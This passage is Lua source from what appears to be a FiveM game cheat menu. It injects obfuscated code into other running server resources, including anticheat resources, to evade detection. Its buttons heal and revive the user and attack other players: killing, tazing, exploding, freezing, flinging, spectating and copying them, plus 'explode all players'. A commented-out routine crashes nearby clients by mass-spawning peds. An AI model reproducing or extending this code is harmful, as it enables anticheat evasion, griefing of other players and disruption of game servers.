        SetPedComponentVariation(ped, 3, 5, 0, 2)
        -- Legs
        SetPedComponentVariation(ped, 4, 42, 0, 2)
        -- Shoes
        SetPedComponentVariation(ped, 6, 6, 0, 2)
        -- Hat
        SetPedPropIndex(ped, 0, 26, 0, true)
        -- Glasses
        SetPedPropIndex(ped, 1, 3, 0, true)
    end

    FodoMafia()
end)

MachoMenuButton(PlayerTabSections[3], "Heal", function()
    SetEntityHealth(PlayerPedId(), 200)
end)

MachoMenuButton(PlayerTabSections[3], "Armor", function()
    SetPedArmour(PlayerPedId(), 100)
end)

MachoMenuButton(PlayerTabSections[3], "Fill Hunger", function()
    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function DawrjatjsfAW()
            TriggerEvent('esx_status:set', 'hunger', 1000000)
        end

        DawrjatjsfAW()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Fill Thirst", function()
    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function sWj238fsMAw()
            TriggerEvent('esx_status:set', 'thirst', 1000000)
        end

        sWj238fsMAw()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Revive", function()
    MachoInjectResource2(3, CheckResource("ox_inventory") and "ox_inventory" or CheckResource("ox_lib") and "ox_lib" or CheckResource("es_extended") and "es_extended" or CheckResource("qb-core") and "qb-core" or CheckResource("wasabi_ambulance") and "wasabi_ambulance" or CheckResource("ak47_ambulancejob") and "ak47_ambulancejob" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function AcjU5NQzKw()
            if GetResourceState('prp-injuries') == 'started' then
                TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                return
            end

            if GetResourceState('es_extended') == 'started' then
                TriggerEvent("esx_ambulancejob:revive")
                return
            end

            if GetResourceState('qb-core') == 'started' then
                TriggerEvent("hospital:client:Revive")
                return
            end

            if GetResourceState('wasabi_ambulance') == 'started' then
                TriggerEvent("wasabi_ambulance:revive")
                return
            end

            if GetResourceState('ak47_ambulancejob') == 'started' then
                TriggerEvent("ak47_ambulancejob:revive")
                return
            end

            NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
            BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

            RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
            RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
        end

        AcjU5NQzKw()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Suicide", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function RGybF0JqEt()
            local aSdFgHjKlQwErTy = SetEntityHealth
            aSdFgHjKlQwErTy(PlayerPedId(), 0)
        end

        RGybF0JqEt()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Force Ragdoll", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function awfAEDSADWEf()
            local cWAmdjakwDksFD = SetPedToRagdoll
            cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
        end

        awfAEDSADWEf()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Clear Task", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function iPfT7kN3dU()
            local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
            zXcVbNmAsDfGhJk(PlayerPedId())
        end

        iPfT7kN3dU()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Clear Vision", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function MsVqZ29ptY()
            local qWeRtYuIoPlMnBv = ClearTimecycleModifier
            local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

            qWeRtYuIoPlMnBv()
            kJfGhTrEeWqAsDz()
        end

        MsVqZ29ptY()
    ]])
end)

MachoMenuButton(PlayerTabSections[3], "Randomize Outfit", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function UxrKYLp378()
            local UwEsDxCfVbGtHy = PlayerPedId
            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
            local QwAzXsEdCrVfBg = SetPedComponentVariation
            local LkJhGfDsAqWeRt = SetPedHeadBlendData
            local MnBgVfCdXsZaQw = SetPedHairColor
            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
            local TyUiOpAsDfGhJk = SetPedHeadOverlay
            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
            local DfGhJkLzXcVbNm = ClearPedProp

            local function PqLoMzNkXjWvRu(component, exclude)
                local ped = UwEsDxCfVbGtHy()
                local total = FdSaQwErTyUiOp(ped, component)
                if total <= 1 then return 0 end
                local choice = exclude
                while choice == exclude do
                    choice = math.random(0, total - 1)
                end
                return choice
            end

            local function OxVnBmCxZaSqWe(component)
                local ped = UwEsDxCfVbGtHy()
                local total = FdSaQwErTyUiOp(ped, component)
                return total > 1 and math.random(0, total - 1) or 0
            end

            local ped = UwEsDxCfVbGtHy()

            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

            local face = math.random(0, 45)
            local skin = math.random(0, 45)
            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

            local hairMax = FdSaQwErTyUiOp(ped, 2)
            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
            MnBgVfCdXsZaQw(ped, 0, 0)

            local brows = RtYuIoPlMnBvCx(2)
            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

            DfGhJkLzXcVbNm(ped, 0)
            DfGhJkLzXcVbNm(ped, 1)
        end

        UxrKYLp378()
    ]])
end)


-- Server Tab
MachoMenuButton(ServerTabSections[1], "Kill Player", function()
    local oPlMnBvCxZaQwEr = MachoMenuGetSelectedPlayer()
    if oPlMnBvCxZaQwEr and oPlMnBvCxZaQwEr > 0 then
        MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function UiLpKjHgFdSaTrEq()
                local RvTyUiOpAsDfGhJ = %d

                local dFrTgYhUjIkLoPl = CreateThread
                dFrTgYhUjIkLoPl(function()
                    Wait(0)

                    local ZxCvBnMaSdFgTrEq = GetPlayerPed
                    local TyUiOpAsDfGhJkLz = GetEntityCoords
                    local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                    local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                    if not pEd or not DoesEntityExist(pEd) then return end

                    local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                    local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                    QwErTyUiOpAsDfGh(
                        oRiGiN.x, oRiGiN.y, oRiGiN.z,
                        tArGeT.x, tArGeT.y, tArGeT.z,
                        500.0,
                        true,
                        GetHashKey("WEAPON_ASSAULTRIFLE"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                end)
            end

            UiLpKjHgFdSaTrEq()
        ]]):format(oPlMnBvCxZaQwEr))
    end
end)

MachoMenuButton(ServerTabSections[1], "Taze Player", function()
    local oPlMnBvCxZaQwEr = MachoMenuGetSelectedPlayer()
    if oPlMnBvCxZaQwEr and oPlMnBvCxZaQwEr > 0 then
        MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function UiLpKjHgFdSaTrEq()
                local RvTyUiOpAsDfGhJ = %d

                local dFrTgYhUjIkLoPl = CreateThread
                dFrTgYhUjIkLoPl(function()
                    Wait(0)

                    local ZxCvBnMaSdFgTrEq = GetPlayerPed
                    local TyUiOpAsDfGhJkLz = GetEntityCoords
                    local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                    local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                    if not pEd or not DoesEntityExist(pEd) then return end

                    local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                    local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                    QwErTyUiOpAsDfGh(
                        oRiGiN.x, oRiGiN.y, oRiGiN.z,
                        tArGeT.x, tArGeT.y, tArGeT.z,
                        0,
                        true,
                        GetHashKey("WEAPON_STUNGUN"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                end)
            end

            UiLpKjHgFdSaTrEq()
        ]]):format(oPlMnBvCxZaQwEr))
    end
end)

MachoMenuButton(ServerTabSections[1], "Explode Player", function()
    local xVbNmZxLcVbNpLo = MachoMenuGetSelectedPlayer()
    if xVbNmZxLcVbNpLo and xVbNmZxLcVbNpLo > 0 then
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function TzYuIoPlMnBvCxZa()
                local iOpAsDfGhJkLzXcV = %d

                local ZqWeRtYuIoPlMnB = CreateThread
                ZqWeRtYuIoPlMnB(function()
                    Wait(0)

                    local jBtWxFhPoZuR = GetPlayerPed
                    local mWjErTbYcLoU = GetEntityCoords
                    local aSdFgTrEqWzXcVb = AddExplosion

                    local pEd = jBtWxFhPoZuR(iOpAsDfGhJkLzXcV)
                    if not pEd or not DoesEntityExist(pEd) then return end

                    local coords = mWjErTbYcLoU(pEd)
                    aSdFgTrEqWzXcVb(coords.x, coords.y, coords.z, 6, 10.0, true, false, 1.0)
                end)
            end

            TzYuIoPlMnBvCxZa()
        ]]):format(xVbNmZxLcVbNpLo))
    end
end)

MachoMenuButton(ServerTabSections[1], "Give All Nearby Objects", function()
    local xVbNmZxLcVbNpLo = MachoMenuGetSelectedPlayer()
    if xVbNmZxLcVbNpLo and xVbNmZxLcVbNpLo > 0 then
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function TzYuIoPlMnBvCxZa()
                local xWcErTvBnMzLp = %d

                local aGhJkLpOiUyTr = _G.GetPlayerPed
                local bUiOpLkJhGfDs = _G.DoesEntityExist
                local cPzWsXcEdCvBnM = _G.GetEntityCoords
                local dRtYuIoPlMnBgF = _G.SetEntityCoords
                local eAsDfGhJkLqWe = _G.RequestControlOfEntity or RequestCtrlOverEntity
                local fZxCvBnMqWeRt = _G.NetworkRequestControlOfEntity
                local gXcVbNmZqWeRt = _G.SetEntityAsMissionEntity

                local function iRequest(obj)
                    fZxCvBnMqWeRt(obj)
                    eAsDfGhJkLqWe(obj)
                    gXcVbNmZqWeRt(obj, true, true)
                end

                CreateThread(function()
                    Wait(0)

                    local targetPed = aGhJkLpOiUyTr(xWcErTvBnMzLp)
                    if not bUiOpLkJhGfDs(targetPed) then return end
                    local coords = cPzWsXcEdCvBnM(targetPed)

                    for obj in EnumerateObjects() do
                        if bUiOpLkJhGfDs(obj) then
                            iRequest(obj)
                            dRtYuIoPlMnBgF(obj, coords.x, coords.y, coords.z, false, false, false, false)
                        end
                    end
                end)
            end

            TzYuIoPlMnBvCxZa()

        ]]):format(xVbNmZxLcVbNpLo))
    end
end)

MachoMenuButton(ServerTabSections[1], "Teleport To Player", function()
    local FtZpLaWcVyXbMn = MachoMenuGetSelectedPlayer()
    if FtZpLaWcVyXbMn and FtZpLaWcVyXbMn > 0 then
        MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function GhJkUiOpLzXcVbNm()
                local kJfHuGtFrDeSwQa = %d
                local oXyBkVsNzQuH = GetPlayerPed
                local zXcVbNmQwErTyUi = GetEntityCoords
                local xAsDfGhJkLpOiU = SetEntityCoords

                local myPed = PlayerPedId()
                local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                local targetCoords = zXcVbNmQwErTyUi(targetPed)

                xAsDfGhJkLpOiU(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
            end

            GhJkUiOpLzXcVbNm()
        ]]):format(FtZpLaWcVyXbMn))
    end
end)

MachoMenuButton(ServerTabSections[1], "Kick From Vehicle", function()
    local FtZpLaWcVyXbMn = MachoMenuGetSelectedPlayer()
    if FtZpLaWcVyXbMn and FtZpLaWcVyXbMn > 0 then
        MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
            local function GhJkUiOpLzXcVbNm()
                local kJfHuGtFrDeSwQa = %d
                local oXyBkVsNzQuH = _G.GetPlayerPed
                local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                local wQeRtYuIoPlMn = _G.PlayerPedId
                local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                local veh = yZaSdFgHjKlQ(targetPed, 0)

                local function nMzXcVbNmQwErTy(func, ...)
                    local _print = print
                    local function errorHandler(ex)
                        -- _print("SCRIPT ERROR: " .. ex)
                    end

                    local argsStr = ""
                    for _, v in ipairs({...}) do
                        if type(v) == "string" then
                            argsStr = argsStr .. "\"" .. v .. "\", "
                        elseif type(v) == "number" or type(v) == "boolean" then
                            argsStr = argsStr .. tostring(v) .. ", "
                        else
                            argsStr = argsStr .. tostring(v) .. ", "
                        end
                    end
                    argsStr = argsStr:sub(1, -3)

                    local script = string.format("return func(%%s)", argsStr)
                    local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                    if not fn then
                        -- _print("Error loading script: " .. err)
                        return nil
                    end

                    local success, result = xpcall(function() return fn() end, errorHandler)
                    if not success then
                        -- _print("Error executing script: " .. result)
                        return nil
                    else
                        return result
                    end
                end

                if veh ~= 0 then
                    Wait(100)
                    nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                    ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                    
                    Wait(100)
                    nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                end
            end

            GhJkUiOpLzXcVbNm()
        ]]):format(FtZpLaWcVyXbMn))
    end
end)

MachoMenuButton(ServerTabSections[1], "Freeze Player", function()
    local lPvMxQrTfZb = MachoMenuGetSelectedPlayer()
    if lPvMxQrTfZb and lPvMxQrTfZb > 0 then
        MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
            local function VtQzAfXyYu()
                local RqTfBnLpZo = %d
                local FgTrLpYwVs = GetPlayerPed
                local EoKdCjXqMg = GetEntityCoords
                local ZbLpVnXwQr = GetClosestVehicle
                local WqErTyUiOp = PlayerPedId
                local AsDfGhJkLz = SetPedIntoVehicle
                local PoLiKjUhYg = ClearPedTasks
                local QwErTyUiOp = NetworkRequestControlOfEntity
                local CxZvBnMaSd = GetGameTimer
                local VcMnBgTrEl = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local wfjaw4dtdu = CreateThread
                local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                local tgtCoords = EoKdCjXqMg(tgtPed)
                local veh = ZbLpVnXwQr(tgtCoords, 150.0, 0, 70)

                if not veh or veh == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                QwErTyUiOp(veh)
                Wait(100)
                AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                VcMnBgTrEl(200)
                PoLiKjUhYg(WqErTyUiOp())

                wfjaw4dtdu(function()
                    local start = CxZvBnMaSd()
                    while CxZvBnMaSd() - start < 3000 do
                        TeAxSpDoMj(
                            veh,
                            tgtPed,
                            0.0, 0.0, 10.0,
                            10.0, 0.0, 0.0,
                            true, 0, 0,
                            false, false, 0
                        )
                        VcMnBgTrEl(0)
                    end
                end)
            end

            VtQzAfXyYu()
        ]]):format(lPvMxQrTfZb))
    end
end)

MachoMenuButton(ServerTabSections[1], "Glitch Player", function()
    local WzAxPlQvTy = MachoMenuGetSelectedPlayer()
    if WzAxPlQvTy and WzAxPlQvTy > 0 then
        MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
            local function TnXmLoPrVq()
                local kPdZoWxNq = %d

                local LsKjHgFdSa = GetPlayerPed
                local ZxCvBnMaQw = GetEntityCoords
                local QtRvBnPoLs = GetClosestVehicle
                local VcBgTrElMn = PlayerPedId
                local KdJfGhTyPl = SetPedIntoVehicle
                local TrLkUyIoPl = ClearPedTasks
                local MwZlQxNsTp = NetworkRequestControlOfEntity
                local AsYtGhUiMn = GetGameTimer
                local WqErTyUiOp = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local CrXeTqLpVi = CreateThread

                local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                if not jCaBnErYqK or jCaBnErYqK == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                MwZlQxNsTp(veh)
                Wait(100)
                KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                WqErTyUiOp(200)
                TrLkUyIoPl(VcBgTrElMn())

                CrXeTqLpVi(function()
                    local tGhXpLsMkA = AsYtGhUiMn()
                    local bErXnPoVlC = 3000

                    while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                        TeAxSpDoMj(
                            jCaBnErYqK,
                            xGyPtMdLoB,
                            0, 0, 0,
                            2000.0, 1460.928, 1000.0,
                            10.0, 88.0, 600.0,
                            true, true, true, false, 0
                        )
                        WqErTyUiOp(0)
                    end
                end)
            end

            TnXmLoPrVq()
        ]]):format(WzAxPlQvTy))
    end
end)

MachoMenuButton(ServerTabSections[1], "Limbo Player", function()
    local zPlNmAxTeVo = MachoMenuGetSelectedPlayer()
    if zPlNmAxTeVo and zPlNmAxTeVo > 0 then
        MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
            local function VyTxQzWsCr()
                local lDxNzVrMpY = %d

                local FgTrLpYwVs = GetPlayerPed
                local EoKdCjXqMg = GetEntityCoords
                local ZbLpVnXwQr = GetClosestVehicle
                local WqErTyUiOp = PlayerPedId
                local AsDfGhJkLz = SetPedIntoVehicle
                local PoLiKjUhYg = ClearPedTasks
                local QwErTyUiOp = NetworkRequestControlOfEntity
                local CxZvBnMaSd = GetGameTimer
                local VcMnBgTrEl = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local CrXeTqLpVi = CreateThread

                local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                QwErTyUiOp(veh)
                Wait(100)
                AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                VcMnBgTrEl(200)
                PoLiKjUhYg(WqErTyUiOp())

                CrXeTqLpVi(function()
                    local kYqPmTnVzL = CxZvBnMaSd()
                    local yTbQrXlMwA = 3000
                    local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                    while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                        TeAxSpDoMj(
                            cHvBzNtEkQ,
                            vUpYrTnMwE,
                            0, 0, 0,
                            hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                            true, true, true, true, 0
                        )
                        VcMnBgTrEl(0)
                    end
                end)
            end

            VyTxQzWsCr()
        ]]):format(zPlNmAxTeVo))
    end
end)

MachoMenuButton(ServerTabSections[1], "Copy Appearance", function()
    local LpOiUyTrEeWq = MachoMenuGetSelectedPlayer()
    if LpOiUyTrEeWq and LpOiUyTrEeWq > 0 then
        MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
            local function AsDfGhJkLqWe()
                local ZxCvBnMqWeRt = %d
                local UiOpAsDfGhJk = GetPlayerPed
                local QwErTyUiOpAs = PlayerPedId
                local DfGhJkLqWeRt = DoesEntityExist
                local ErTyUiOpAsDf = ClonePedToTarget

                local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                    local YpAsDfGhJkLq = QwErTyUiOpAs()
                    ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                end
            end

            AsDfGhJkLqWe()
        ]]):format(LpOiUyTrEeWq))
    end
end)

MachoMenuCheckbox(ServerTabSections[1], "Spectate Player", function()
    local sEpTaRgEtXzYw = MachoMenuGetSelectedPlayer()
    if sEpTaRgEtXzYw and sEpTaRgEtXzYw > 0 then
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", ([[
            if AsDfGhJkLpZx == nil then AsDfGhJkLpZx = false end
            AsDfGhJkLpZx = true

            local function QwErTyUiOpAs()
                if AsDfGhJkLpZx == nil then AsDfGhJkLpZx = false end
                AsDfGhJkLpZx = true

                local a1B2c3D4e5F6 = CreateThread
                a1B2c3D4e5F6(function()
                    local k9L8m7N6b5V4 = GetPlayerPed
                    local x1Y2z3Q4w5E6 = GetEntityCoords
                    local u7I8o9P0a1S2 = RequestAdditionalCollisionAtCoord
                    local f3G4h5J6k7L8 = NetworkSetInSpectatorMode
                    local m9N8b7V6c5X4 = NetworkOverrideCoordsAndHeading
                    local r1T2y3U4i5O6 = Wait
                    local l7P6o5I4u3Y2 = DoesEntityExist

                    while AsDfGhJkLpZx and not Unloaded do
                        local d3F4g5H6j7K8 = %d
                        local v6C5x4Z3a2S1 = k9L8m7N6b5V4(d3F4g5H6j7K8)

                        if v6C5x4Z3a2S1 and l7P6o5I4u3Y2(v6C5x4Z3a2S1) then
                            local b1N2m3K4l5J6 = x1Y2z3Q4w5E6(v6C5x4Z3a2S1, false)
                            u7I8o9P0a1S2(b1N2m3K4l5J6.x, b1N2m3K4l5J6.y, b1N2m3K4l5J6.z)
                            f3G4h5J6k7L8(true, v6C5x4Z3a2S1)
                            m9N8b7V6c5X4(x1Y2z3Q4w5E6(v6C5x4Z3a2S1))
                        end

                        r1T2y3U4i5O6(0)
                    end

                    f3G4h5J6k7L8(false, 0)
                end)
            end

            QwErTyUiOpAs()

        ]]):format(sEpTaRgEtXzYw))
    end
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        AsDfGhJkLpZx = false
    ]])
end)

-- MachoMenuButton(ServerTabSections[2], "Crash Nearby [Don't Spam]", function()
--     MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("FiniAC") and "FiniAC") or (CheckResource("WaveShield") and "WaveShield") or (CheckResource("monitor") and "monitor") or "any", [[
--         local function sfehwq34rw7td()
--             local Nwq7sd2Lkq0pHkfa = CreateThread
--             Nwq7sd2Lkq0pHkfa(function()
--                 local hAx9qTeMnb = CreateThread
--                 local Jf9uZxcTwa = _G.CreatePed
--                 local VmzKo3sRt7 = _G.PlayerPedId
--                 local LuZx8nqTys = _G.GetEntityCoords
--                 local QksL02vPdt = _G.GetEntityHeading
--                 local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset
--                 local PfQsXoEr6b = _G.GiveWeaponToPed
--                 local WvNay7Zplm = _G.TaskParachute
--                 local DjRq08bKxu = _G.FreezeEntityPosition
--                 local EkLnZmcTya = _G.GetHashKey
--                 local YdWxVoEna3 = _G.RequestModel
--                 local GcvRtPszYp = _G.HasModelLoaded
--                 local MnVc8sQaLp = _G.SetEntityAsMissionEntity
--                 local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded
--                 local VdNzWqbEyf = _G.DoesEntityExist
--                 local AxWtRuLskz = _G.DeleteEntity
--                 local OplKvms9te = _G.Wait
--                 local BnQvKdsLxa = _G.GetGroundZFor_3dCoord
--                 local VmxrLa9Ewt = _G.ApplyForceToEntity
--                 local fwafWAefAg = _G.SetEntityVisible
--                 local awrt325etd = _G.SetBlockingOfNonTemporaryEvents
--                 local awfaw4eraq = _G.SetEntityAlpha

--                 hAx9qTeMnb(function()
--                     local QxoZnmWlae = VmzKo3sRt7()
--                     local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae)
--                     local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae)
--                     local ZtXmqLpEas = EzPwqLtYas.z + 1600.0

--                     Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

--                     VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

--                     OplKvms9te(250)

--                     DjRq08bKxu(QxoZnmWlae, true)

--                     PfQsXoEr6b(QxoZnmWlae, `gadget_parachute`, 1, false, true)
--                     WvNay7Zplm(QxoZnmWlae, false)

--                     DjRq08bKxu(QxoZnmWlae, true)

--                     local UixZpvLoa9 = EkLnZmcTya("player_one")
--                     YdWxVoEna3(UixZpvLoa9)
--                     while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

--                     local TzsPlcxQam = {}
--                     for K9wo = 1, 130 do
--                         local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
--                         if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
--                             MnVc8sQaLp(IuxErv7Pqa, true, true)
--                             awrt325etd(IuxErv7Pqa, true)
--                             awfaw4eraq(IuxErv7Pqa, 0, true)
--                             table.insert(TzsPlcxQam, IuxErv7Pqa)
--                         end
--                         OplKvms9te(1)
--                     end

--                     KrXpTuwq9c(UixZpvLoa9)

--                     OplKvms9te(300)

--                     for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
--                         if VdNzWqbEyf(bTzyPq7Xsl) then
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                             AxWtRuLskz(bTzyPq7Xsl)
--                         end
--                     end

--                     DjRq08bKxu(QxoZnmWlae, false)
--                     local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
--                     if not ZkxyPqtLs0 then
--                         Zfound = EzPwqLtYas.z
--                     end
--                     OplKvms9te(1000)

--                     Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
--                     DjRq08bKxu(QxoZnmWlae, true)

--                     DjRq08bKxu(QxoZnmWlae, false)
--                 end)
--             end)
--         end

--         sfehwq34rw7td()
--     ]])
-- end)

MachoMenuButton(ServerTabSections[2], "Cone Everyone", function() 
    local model = GetHashKey("prop_roadcone02a")
    RequestModel(model) 
    while not HasModelLoaded(model) do 
        Wait(0) 
    end

    local function putCone(ped)
        if not DoesEntityExist(ped) or IsEntityDead(ped) then return end
        local pos = GetEntityCoords(ped)
        local obj = CreateObject(model, pos.x, pos.y, pos.z, true, true, false)
        SetEntityAsMissionEntity(obj, true, true)
        SetEntityCollision(obj, false, false)
        SetEntityInvincible(obj, true)
        SetEntityCanBeDamaged(obj, false)
        local head = GetPedBoneIndex(ped, 31086)
        AttachEntityToEntity(obj, ped, head, 0.0, 0.0, 0.25, 0.0, 0.0, 0.0, 
            false, false, true, false, 2, true)
    end

    putCone(PlayerPedId())

    for _, pid in ipairs(GetActivePlayers()) do
        putCone(GetPlayerPed(pid))
    end

    local peds = GetGamePool and GetGamePool('CPed') or {}
    for _, ped in ipairs(peds) do
        if not IsPedAPlayer(ped) then
            putCone(ped)
        end
    end
end)

MachoMenuButton(ServerTabSections[2], "Explode All Players", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function fGhJkLpOiUzXcVb()
            local aSdFgHjKlQwErTy = GetActivePlayers
            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = GetEntityCoords
            local hGjFkDlSaPwOeIr = AddOwnedExplosion
            local tYuIoPaSdFgHjKl = PlayerPedId

            local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
            for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
